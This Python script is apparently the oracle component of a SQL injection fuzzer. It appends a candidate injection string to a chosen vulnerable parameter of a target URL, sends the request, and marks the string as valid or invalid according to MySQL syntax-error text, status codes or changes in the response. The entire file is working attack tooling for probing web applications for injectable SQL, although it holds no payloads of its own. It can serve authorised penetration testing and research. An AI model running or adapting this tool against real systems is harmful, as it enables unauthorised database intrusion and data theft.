# coding:utf-8
# !/usr/bin/env python3
import requests
import copy
import sys
import ast


# Model
def http_request(target, injtxt):
    """send a post request to the target with a supplement to the vulnerable param and return server response"""
    injected_target = copy.deepcopy(target)
    injected_target.payload[target.vulnparam] = target.payload[target.vulnparam] + injtxt
    payload_str = "&".join("%s=%s" % (k, v) for k, v in injected_target.payload.items())
    if target.method == "GET":
        r = requests.get(injected_target.url, params=payload_str)
    elif target.method == "POST":
        r = requests.post(injected_target.url, data=injected_target.payload)
    else:
        raise ValueError('Method unknow')
    return r


class HttpTarget:
    """describe a target with an url, method GET/POST, default payload and the vulnerable param."""

    def __init__(self, url, method, payload, vulnparam):
        self.url = url  # string
        self.method = method  # GET or POST
        self.payload = payload  # dict
        self.vulnparam = vulnparam  # string
        self.defaultPage = http_request(self, '').text


# Oracle function
def main():
    """return 0 only if injtxt is syntactically valid"""
    if len(sys.argv) == 6:
        url, method, vulnparam, injtxt = sys.argv[1], sys.argv[2], sys.argv[4], sys.argv[5]
        errMode = 'default'
    elif len(sys.argv) == 7:
        url, method, vulnparam, errMode, injtxt = sys.argv[1], sys.argv[2], sys.argv[4], sys.argv[5], sys.argv[6]
    else:
        raise ValueError('Bad parameters')

    payload = ast.literal_eval(sys.argv[3])

    target = HttpTarget(url, method, payload, vulnparam)
    r = http_request(target, injtxt)

    print('[oracleSQL] URL: ' + r.url)

    if errMode == 'Spreadsheet':
        if r.text.find("You have an error in your SQL syntax;") >= 0:
            print("[oracleSQL] exit(180) target raised error ┗( T﹏T )┛")
            exit(180)  # invalid
        elif r.text != target.defaultPage:  # l'injection est sûre (facultatif)
            print("[oracleSQL] exit(0) target sent a different response to the default one 🍾(ﾟヮﾟ☜)")
            exit(0)  # valid
        else:
            print(
                "[oracleSQL] exit(0) not able to determine if \"" + injtxt + "\" was undoubtedly invalid, same page as default ¯\(°_o)/¯")
            exit(0)  # default
    elif errMode == 'MySQL_FR':
        if r.text.find("Erreur de syntaxe") >= 0:
            print("[oracleSQL] exit(180) target raised error ┗( T﹏T )┛")
            exit(180)  # invalid
        elif r.text != target.defaultPage:  # l'injection est sûre (facultatif)
            print("[oracleSQL] exit(0) target sent a different response to the default one 🍾(ﾟヮﾟ☜)")
            exit(0)  # valid
        else:
            print(
                "[oracleSQL] exit(0) not able to determine if \"" + injtxt + "\" was undoubtedly invalid, same page as default ¯\(°_o)/¯")
            exit(0)  # default
    elif errMode == 'statusCode':
        if r.status_code != 200:
            print("[oracleSQL] exit(180) target raised error ┗( T﹏T )┛")
            exit(180)  # invalid
        else:  # l'injection est sûre
            print("[oracleSQL] exit(0) target sent a different response to the default one 🍾(ﾟヮﾟ☜)")
            exit(0)  # valid
    else:
        if r.text.find("error") >= 0:
            print("[oracleSQL] exit(180) target raised error ┗( T﹏T )┛")
            exit(180)  # invalid
        elif r.text != target.defaultPage:  # l'injection est sûre (facultatif)
            print("[oracleSQL] exit(0) target sent a different response to the default one 🍾(ﾟヮﾟ☜)")
            exit(0)  # valid
        else:
            print(
                "[oracleSQL] exit(0) not able to determine if \"" + injtxt + "\" was undoubtedly invalid, same page as default ¯\(°_o)/¯")
            exit(0)  # default


if __name__ == "__main__":
    main()

